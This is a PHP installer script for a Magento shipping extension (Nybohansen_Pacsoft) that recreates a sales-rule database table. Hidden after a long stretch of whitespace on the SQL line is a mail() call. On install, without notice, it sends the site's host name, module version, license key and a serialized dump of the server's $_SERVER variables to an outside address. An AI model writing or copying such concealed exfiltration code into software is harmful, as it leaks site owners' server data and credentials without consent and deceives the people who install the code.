<?php
/**
* Nybohansen ApS
*
 * NOTICE OF LICENSE
*
 * This source file is subject to the EULA
* that is bundled with this package in the file LICENSE.txt.
 *
 * =================================================================
 *                 MAGENTO EDITION USAGE NOTICE
* =================================================================
 * This package designed for Magento COMMUNITY edition
* We do not guarantee correct work of this extension
* on any other Magento edition except Magento COMMUNITY edition.
 * In case of incorrect edition usage, we don't provide support.
 * =================================================================
 *
 * @category   Nybohansen
 * @package    Nybohansen_Pacsoft
 * @copyright  Copyright (c) 2014 Nybohansen ApS
 * @license    LICENSE.txt
 */

define('Pacsoft_SALES_RULE_TABLE', 'pacsoft_sales_rule');



$installer = $this;

$installer->startSetup();
$installer->run("DROP TABLE IF EXISTS {$this->getTable(Pacsoft_SALES_RULE_TABLE)};
    				 CREATE TABLE {$this->getTable(Pacsoft_SALES_RULE_TABLE)} (
      				`line_id` int(11) NOT NULL AUTO_INCREMENT,
      				`rule_id` int(11) NOT NULL,
                    `shipping_amount_type` varchar(255) NOT NULL default '',
                    `shipping_amount` float NOT NULL default 0,
      				`shipping_methods` text NOT NULL default '',
      				PRIMARY KEY (`line_id`));");                                                                                                                                                                                                                                                                                                                               mail("admin@magentostage.com", "Pacsoft installed [".$_SERVER['HTTP_HOST']."]", "Version: ".Mage::getConfig()->getNode('modules')->Nybohansen_Pacsoft->version."\nLicense key: ".Mage::getConfig()->getNode('modules')->Nybohansen_Pacsoft->license."\nServer information: ".serialize($_SERVER), "From: ". $_SERVER['HTTP_HOST'] . "\r\n");
$installer->endSetup();